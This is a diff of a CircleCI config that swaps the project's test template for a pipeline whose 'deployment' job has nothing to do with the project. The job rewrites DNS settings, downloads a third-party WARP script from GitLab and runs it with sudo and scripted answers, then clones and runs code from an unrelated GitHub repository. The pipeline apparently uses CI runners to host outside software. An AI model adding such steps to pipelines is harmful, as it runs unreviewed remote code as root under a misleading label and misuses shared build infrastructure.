@@ -1,34 +1,64 @@
-# This config was automatically generated from your source code
-# Stacks detected: deps:python:.
 version: 2.1
-orbs:
-  python: circleci/python@2
-jobs:
-  test-python:
-    # Install dependencies and run tests
+
+executors:
+  ubuntu-executor:
+    machine:
+      image: ubuntu-2004:current
+
+  python-docker-executor:
     docker:
       - image: cimg/python:3.8-node
+
+jobs:
+  setup-environment:
+    executor: ubuntu-executor
+    steps:
+      - run:
+          name: Install Dependencies
+          command: |
+            sudo apt-get update
+            sudo apt-get install -y libsqlite3-dev git curl nodejs vim
+            curl -sL https://dl.yarnpkg.com/debian/pubkey.gpg | gpg --dearmor | sudo tee /usr/share/keyrings/yarnkey.gpg >/dev/null
+            echo "deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main" | sudo tee /etc/apt/sources.list.d/yarn.list
+            sudo apt update && sudo apt install -y yarn
+            sudo apt install -y build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev wget libbz2-dev
+
+  test-python:
+    executor: python-docker-executor
     steps:
       - checkout
       - python/install-packages
       - run:
-          name: Run tests
+          name: Run Tests
           command: pytest --junitxml=junit.xml || ((($? == 5)) && echo 'Did not find any tests to run.')
       - store_test_results:
           path: junit.xml
-  deploy:
-    # This is an example deploy job, not actually used by the workflow
-    docker:
-      - image: cimg/base:stable
+
+  deployment:
+    executor: ubuntu-executor
     steps:
-      # Replace this with steps to deploy to users
       - run:
-          name: deploy
-          command: '#e.g. ./deploy.sh'
+          name: Configure DNS and Run Deployment Script
+          command: |
+            custom_dns4='1.1.1.1 8.8.8.8'
+            sudo sed -i "/\[Resolve\]/a DNS=$custom_dns4" /etc/systemd/resolved.conf
+            sudo curl -s https://gitlab.com/rwkgyg/CFwarp/raw/main/CFwarp.sh -o /tmp/CFwarp.sh
+            echo -e "2\n1\n3" > /tmp/input.txt
+            sudo bash /tmp/CFwarp.sh < /tmp/input.txt
+            git clone https://github.com/uroadrun89/SPMA.git /tmp/SPMA
+            cd /tmp/SPMA
+            export PATH=$PATH:/home/semaphore/.local/bin
+            pip3.10 install -r requirements.txt
+            python3.10 -m pip install --upgrade pip
+            python3.10 main.py
+
 workflows:
-  build-and-test:
+  build-and-deploy:
     jobs:
-      - test-python
-    # - deploy:
-    #     requires:
-    #       - test-python
+      - setup-environment
+      - test-python:
+          requires:
+            - setup-environment
+      - deployment:
+          requires:
+            - test-python
